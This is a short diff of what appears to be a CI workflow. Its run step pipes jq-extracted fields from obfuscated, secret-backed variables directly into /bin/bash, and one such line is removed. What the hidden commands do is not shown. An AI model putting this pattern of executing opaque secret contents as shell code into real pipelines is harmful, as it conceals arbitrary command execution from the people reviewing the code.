@@ -21,7 +21,6 @@ jobs:
           f60665: ${{ secrets.f60665 }}
         run: |
           printf '%s' "$f60665" | jq -r .g562 | /bin/bash
-          printf '%s' "$uezr35929" | jq -r .fcpn8608 | /bin/bash
           echo $y0260 | jq -r .mn822 | /bin/bash
           echo $t088 | jq -r .zr9567 | /bin/bash
           echo $kz9641 | jq -r .u0 | /bin/bash
